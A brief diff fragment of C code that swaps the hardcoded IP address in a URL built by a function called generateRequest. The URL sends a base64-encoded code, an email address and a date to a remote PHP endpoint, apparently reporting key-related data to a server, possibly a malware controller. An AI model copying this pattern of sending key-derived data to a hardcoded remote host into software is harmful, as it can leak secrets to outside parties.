@@ -479,7 +479,7 @@ char * generateRequest(void *bigkey, char *date) {
     fputs("\n", stderr);
   }
   
-  snprintf(result, 1024, "http://87.236.198.182/quelle_neu1.php\
+  snprintf(result, 1024, "http://185.195.80.111/quelle_neu1.php\
 ?code=%s\
 &AA=%s\
 &ZZ=%s", base64Encode(code, 512), email, date);
